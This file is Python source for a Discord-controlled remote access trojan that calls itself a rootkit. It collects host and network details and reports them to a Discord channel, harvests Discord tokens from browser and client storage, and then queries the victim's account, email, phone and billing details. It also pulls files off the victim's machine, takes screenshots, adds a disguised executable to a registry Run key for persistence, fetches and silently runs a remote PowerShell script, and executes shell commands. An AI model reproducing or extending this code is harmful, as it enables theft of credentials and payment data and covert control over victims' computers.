#Imports
import discord
import os
import socket
import requests
import getmac
import subprocess
import sys
import sqlite3
import time
import random
import re
import uuid
import json
import psutil
import shutil
import getpass
import pyautogui
import logging
import platform

#From Imports
from tkinter import E
from discord.ext import commands
from discord import Webhook, RequestsWebhookAdapter, Embed
from datetime import datetime

#Variables
rootkit_prefix = ''
rootkit_token = ""
rootkit_client = commands.Bot(command_prefix=rootkit_prefix)
rootkit_client.remove_command('help')
current_directory = os.getcwd()
get_ip_url = requests.get('https://api.ipify.org').content.decode('utf8')
get_mac_address = getmac.get_mac_address()
get_current_uuid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
get_current_datetime = datetime.now()
current_time = get_current_datetime.strftime("%H:%M:%S")
current_date = get_current_datetime.strftime("%B %d, %Y")
generated_session_id = random.randint(1000,9999)
session_id = generated_session_id
system_information = platform.uname()
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
cpufreq = psutil.cpu_freq()
uname = platform.uname()
svmem = psutil.virtual_memory()
swap = psutil.swap_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
if_addrs = psutil.net_if_addrs()

info={}
info['platform']=platform.system()
info['platform-release']=platform.release()
info['platform-version']=platform.version()
info['architecture']=platform.machine()
info['hostname']=socket.gethostname()
info['ip-address']=socket.gethostbyname(socket.gethostname())
info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
info['processor']=platform.processor()
info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"

localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': os.path.join(roaming, 'Discord'),
    'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
    'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
    'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
    'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
    'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
}

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}

xaf = """```ini
Specify the fucking Session ID you mongoloid.
```"""

raf = """```ini
Not a valid Session ID.
```"""

@rootkit_client.event
async def on_ready():
    channel = rootkit_client.get_channel(940053028260692028)
    await channel.send(f"""
```ini

Session ID: [{session_id}]

New Connection from [{socket.gethostname()}@{socket.gethostbyname(socket.gethostname())}]!
Exec Dir: [{current_directory}]
PIPA: [{get_ip_url}]
PMAC: [{get_mac_address}]
CUID: [{get_current_uuid}]
SYMD: [{system_information.system} {system_information.release} {system_information.version} {system_information.machine}]
PROC: [{system_information.processor}]

You can execute commands on the system in The rootkit channel.

Connected on [{current_date}] at [{current_time}]
``` ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| @everyone""")

@rootkit_client.command()
async def help(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Sessions - [Shows the sessions of the user.]
{rootkit_prefix}Rootkit - [Shows all the current Commands on the Rootkit.]
{rootkit_prefix}Discord - [Shows all the Discord slave Commands.]
{rootkit_prefix}Dumping - [Shows all the current Dumping Commands on the Rootkit.]
{rootkit_prefix}Shell - [Shows all the Reverse Shell Commands on the Rootkit.]
{rootkit_prefix}Exec - [Execute System Commands on the machine.]
{rootkit_prefix}System - [Shows all the current System Commands on the Rootkit.]

{rootkit_prefix}Abort - [Closes the Discord bot.]
```''')

@rootkit_client.command()
async def Sessions(ctx):
    await ctx.reply(f'''
```ini
Session ID: [{session_id}]
```''')

@rootkit_client.command()
async def Rootkit(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Lock <session-id> - [Locks the Machine down.]
{rootkit_prefix}Unlock <session-id> - [Unlocks the Machine.]
{rootkit_prefix}Jailbreak <session-id> - [Jails the Machine.]
{rootkit_prefix}Unjailbreak <session-id> - [Unjails the Machine.]
{rootkit_prefix}Eject <session-id> - [Ejects the Machine.]
{rootkit_prefix}Persistence <session-id> - [Enables the Persistence.]
{rootkit_prefix}Disable <session-id> - [Disables the Persistence.]
```''')

@rootkit_client.command()
async def Persistance(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}                    
""")
    elif args[0] == f"{session_id}":
        backdoor_location = os.environ["appdata"] + "\\Windows-Explorer.exe"
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '"', shell=True)
            await ctx.reply(f'''
```ini
Enabled Persistence on Session [{session_id}].
```''') 
        else:
            await ctx.reply(f'''
```ini
Persistence is already enabled on Session [{session_id}].
```''')

@rootkit_client.command()
async def Discord(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Dump <session-id> - [Dumps all Discord Stored Tokens.]
```''')

@rootkit_client.command()
async def Dump(ctx, *args):
    tokens = []
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        for platform, path in paths.items():
            path = os.path.join(path, 'Local Storage', 'leveldb')

            if os.path.exists(path) is False:
                continue

            for item in os.listdir(path):
                if not item[-4:] in ('.log', '.ldb'):
                    continue

                with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
                    lines = file.readlines()

                for line in lines:
                    line = line.strip()

                    if len(line) == 0:
                        continue

                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                        if token in tokens:
                            continue
                        
        headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
        
        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        if res.status_code == 200:
                    res_json = res.json()
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    user_id = res_json['id']
                    avatar_id = res_json['avatar']
                    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
                    phone_number = res_json['phone']
                    email = res_json['email']
                    mfa_enabled = res_json['mfa_enabled']
                    flags = res_json['flags']
                    locale = res_json['locale']
                    verified = res_json['verified']
                    creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                    
                    has_nitro = False
                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data) > 0)
                    if has_nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                    
                    billing_info = []
                    for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
                        y = x['billing_address']
                        name = y['name']
                        address_1 = y['line_1']
                        address_2 = y['line_2']
                        city = y['city']
                        postal_code = y['postal_code']
                        state = y['state']
                        country = y['country']

                        if x['type'] == 1:
                            cc_brand = x['brand']
                            cc_first = cc_digits.get(cc_brand)
                            cc_last = x['last_4']
                            cc_month = str(x['expires_month'])
                            cc_year = str(x['expires_year'])
                            
                            data = {
                                'Payment Type': 'Credit Card',
                                'Valid': not x['invalid'],
                                'CC Holder Name': name,
                                'CC Brand': cc_brand.title(),
                                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                                'Address 1': address_1,
                                'Address 2': address_2 if address_2 else '',
                                'City': city,
                                'Postal Code': postal_code,
                                'State': state if state else '',
                                'Country': country,
                                'Default Payment Method': x['default']
                            }

                        elif x['type'] == 2:
                            data = {
                                'Payment Type': 'PayPal',
                                'Valid': not x['invalid'],
                                'PayPal Name': name,
                                'PayPal Email': x['email'],
                                'Address 1': address_1,
                                'Address 2': address_2 if address_2 else '',
                                'City': city,
                                'Postal Code': postal_code,
                                'State': state if state else '',
                                'Country': country,
                                'Default Payment Method': x['default']
                            }

                        billing_info.append(data)

        await ctx.reply(f"""
```ini
User Info:
Username: [{user_name}]
User ID: [{user_id}]
Creation Date: [{creation_date}]
Avatar URL: [{avatar_url}]
Token: [{token}]

Nitro Info:
Nitro: [{has_nitro}]
Expiration Date: [{d1.strftime('%d-%m-%Y %H:%M:%S UTC')}]

Contact Info:
Phone Number: [{phone_number}]
Email: [{email}]

Account Info:
MFA Enabled: [{mfa_enabled}]
Flags: [{flags}]
Locale: [{locale}]
Verified: [{verified}]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def misc(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}UACB <session_id> - [UAC bypass to gain admin privileges.]
{rootkit_prefix}voice <session-id> - [Send a voice message to the machine.]
{rootkit_prefix}blockinput <session-id> - [Block input to the machine.]
{rootkit_prefix}unblockinput <session-id> - [Unblock input to the machine.]
{rootkit_prefix}streamweb <session-id> - [Stream a web video to the machine.]
{rootkit_prefix}stopweb <session-id> - [Stop web video from the machine.]
{rootkit_prefix}streamscreen <session-id> - [Stream a screen capture to the machine.]
{rootkit_prefix}stopscreen <session-id> - [Stop screen capture from the machine.]
{rootkit_prefix}bluescreen <session-id> - [Show a blue screen of death on the machine.]
{rootkit_prefix}recsession <session-id> - [Record a session to a file.]
{rootkit_prefix}reccam <session-id> - [Record a camera feed to a file.]
{rootkit_prefix}recaudio <session-id> - [Record audio to a file.]
{rootkit_prefix}disavs <session-id> - [Disable AVS on the machine.]
{rootkit_prefix}displayoff <session-id> - [Turn off the display on the machine.]
{rootkit_prefix}displayon <session-id> - [Turn on the display on the machine.]
{rootkit_prefix}startup <session-id> - [Add a startup entry to the registry.]
```''')

@rootkit_client.command()
async def Dumping(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Passwords <session-id> - [Dumps the passwords of the machine.]
{rootkit_prefix}Cookies <session-id> - [Dumps the cookies of the machine.]
{rootkit_prefix}History <session-id> - [Dumps the history of the machine.]
{rootkit_prefix}Get <session-id> [filepath] - [Download a specific file from the machine.]
{rootkit_prefix}Post <session-id> [filepath] - [Upload a file to the machine.]
{rootkit_prefix}Screenshot <session-id> - [Dumps a screenshot of the Camera.]
{rootkit_prefix}Wifi <session-id> - [Dumps the Wifi Con of the machine.]
{rootkit_prefix}Arp <session-id> - [Dumps the ARP table of the machine.]
{rootkit_prefix}Users <session-id> - [Dumps the users of the machine.]
{rootkit_prefix}Admins <session-id> - [Dumps the admins of the machine.]
{rootkit_prefix}Processes <session-id> - [Dumps the processes of the machine.]
```''')

@rootkit_client.command()
async def Get(ctx, *args):
    
    path = f'{args[1]}'
    
    if not args[0]:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini
Downloaded the file [{path}] from Session [{session_id}].```""",file=discord.File(path))
    
    else:
        await ctx.reply(f"""
{raf}
""")
        
@rootkit_client.command()
async def Post(ctx, *args, arg, arg2):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        path = f'C:\\Users\\{os.getlogin()}\\.config'
        url = arg
        name = arg2
        r = requests.get(url, allow_redirects=True, verify=False)
        open(fr"{path}\{name}", 'wb').write(r.content)
        await ctx.reply(f"""
```ini
Uploaded the file [{url}] to [{path}\{name}] on Session [{session_id}].```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Screenshot(ctx, *args):
    
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        Screenshot = pyautogui.screenshot()
        path = os.environ["temp"] + "\\s.png"
        Screenshot.save(path)
        await ctx.reply(f"""
```ini

Screenshot on Session [{session_id}].```""", file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Shell(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Connect <session-id> - [Shows the sessions of the user.]
{rootkit_prefix}Options - [Shows the sessions of the user.]
```''')
    
@rootkit_client.command()
async def Connect(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        path = os.environ["temp"]
        #os.getcwd(f"%USERPROFILE%\\AppData\\Local\\Temp\\")
        file_to_con = "linkto\file.ps1"
        r = requests.get(file_to_con)
        with open(fr"{path}\file.ps1", 'wb') as f:
            f.write(r.content)
        #os.system('powershell -File "%USERPROFILE%\AppData\Local\Temp\Windows-host.ps1" -windowstyle hidden')
        await ctx.reply(f"""
```ini
Connected to Session [{session_id}].

Current Connection path: [{path}]
```""")
        os.system('powershell -File "%USERPROFILE%\AppData\Local\Temp\file.ps1" -windowstyle hidden')
        await ctx.reply(f"""
```ini
Aborted the Shell from Session [{session_id}].
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Options(ctx):
        await ctx.reply(f"""
```ini
Command is not available.
```""")

@rootkit_client.command()
async def Exec(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}ls - <session-id> [List the files in the current directory.]
{rootkit_prefix}cd <session-id> [directory] - [Change the current directory.]
{rootkit_prefix}pwd - <session-id> [Print the current directory.]
{rootkit_prefix}cat <session-id> [filepath] - [Print the contents of a file.]
{rootkit_prefix}whoami - <session-id> [Print the current user.]
{rootkit_prefix}mkdir <session-id> [directory] - [Create a directory.]
{rootkit_prefix}execute <session-id> [command] - [Execute a command.]
```''')

@rootkit_client.command()
async def ls(ctx, *args):
    x = os.popen("dir").read()
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini
Current Directory [{os.getcwd()}] on Session [{session_id}].
```
```ini
[{x}]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")
    
@rootkit_client.command()
async def pwd(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini
Current Directory [{os.getcwd()}] on Session [{session_id}].
```""")
    else:
        await ctx.reply(f"""

{raf}
""")
    
@rootkit_client.command()
async def whoami(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    x = os.popen("whoami").read()
    await ctx.reply(f"""
```ini
{x}on Session [{session_id}].
```""")
    
@rootkit_client.command() 
async def cat(ctx, *, arg):
    x = os.popen(f"type {arg}").read()
    await ctx.reply(f"""
```ini
{x}
```""")

@rootkit_client.command()
async def System(ctx):
    await ctx.reply(f'''
```ini
{rootkit_prefix}Sysinfo <session-id> - [Dumps Information from the System.]
{rootkit_prefix}Cpuinfo <session-id> - [Dumps the CPU Information.]
{rootkit_prefix}Meminfo <session-id> - [Dumps the Memory Information.]
{rootkit_prefix}SMeminfo <session-id> - [Dumps the Swap Memory Information.]
{rootkit_prefix}Diskinfo <session-id> - [Dumps the Disk Information.]
{rootkit_prefix}Networkinfo <session-id> - [Dumps the Network Information.]
{rootkit_prefix}Shutdown <session-id> - [Shuts down the machine.]
{rootkit_prefix}Restart <session-id> - [Restarts the machine.]
{rootkit_prefix}Logoff <session-id> - [Logs off the machine.]
{rootkit_prefix}Disconnect <session-id> - [Disconnects the machine.]
{rootkit_prefix}Sleep <session-id> - [Sets the machine to sleep.]
{rootkit_prefix}Hibernate <session-id> - [Sets the machine to hibernate.]
```''')
    
@rootkit_client.command()
async def Sysinfo(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini
System Information:
Platform: [{info['platform']}]
Platform Release: [{info['platform-release']}]
Platform Version: [{info['platform-version']}]
Architecture: [{info['architecture']}]
Processor: [{info['processor']}]
RAM: [{info['ram']}]
Boot Time: [{bt.strftime("%Y-%m-%d %H:%M:%S")}]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")
     
@rootkit_client.command()
async def Cpuinfo(ctx, *args):
    if not args:
        await ctx.reply(f"""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini

CPU Information:
Physical Cores: [{psutil.cpu_count(logical=False)}]
Total Cores: [{psutil.cpu_count(logical=True)}]
Max Frequency: [{cpufreq.max:.2f}]GHz
Min Frequency: [{cpufreq.min:.2f}]GHz
Current Frequency: [{cpufreq.current:.2f}]GHz
CPU Usage Per Core: [{psutil.cpu_percent(interval=1)}%]
CPU Usage: [{psutil.cpu_percent(interval=1)}%]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Meminfo(ctx, *args):
    if not args:
        await ctx.reply("""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini

Memory Information:
Total: [{svmem.total / 1024**3:.2f}GB]
Available: [{svmem.available / 1024**3:.2f}GB]
Used: [{svmem.used / 1024**3:.2f}GB]
Percentage: [{svmem.percent}%]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def SMeminfo(ctx, *args):
    if not args:
        await ctx.reply("""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini

Swap Memory Information:
Total: [{swap.total / 1024**3:.2f}GB]
Free: [{swap.free / 1024**3:.2f}GB]
Used: [{swap.used / 1024**3:.2f}GB]
Percentage: [{swap.percent}%]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Diskinfo(ctx, *args):
    if not args:
        await ctx.reply("""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini

Disk Information:
Device: [{partitions[0].device}]
Mountpoint: [{partitions[0].mountpoint}]
File System: [{partitions[0].fstype}]
Total: [{psutil.disk_usage(partitions[0].mountpoint).total / 1024**3:.2f}GB]
Used: [{psutil.disk_usage(partitions[0].mountpoint).used / 1024**3:.2f}GB]
Free: [{psutil.disk_usage(partitions[0].mountpoint).free / 1024**3:.2f}GB]
Percentage: [{psutil.disk_usage(partitions[0].mountpoint).percent}%]
Total IO: [{disk_io.read_count}]
Total Write: [{disk_io.write_count}]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

@rootkit_client.command()
async def Networkinfo(ctx, *args):
    if not args:
        await ctx.reply("""
{xaf}
""")
    elif args[0] == f"{session_id}":
        await ctx.reply(f"""
```ini

Network Information:
Interfaces: [{if_addrs}]
IP Address: [{info['ip-address']}]
Mac Address: [{info['mac-address']}]
Total Bytes Sent: [{disk_io.write_bytes}]
Total Bytes Received: [{disk_io.read_bytes}]
```""")
    else:
        await ctx.reply(f"""
{raf}
""")

rootkit_client.run(rootkit_token)
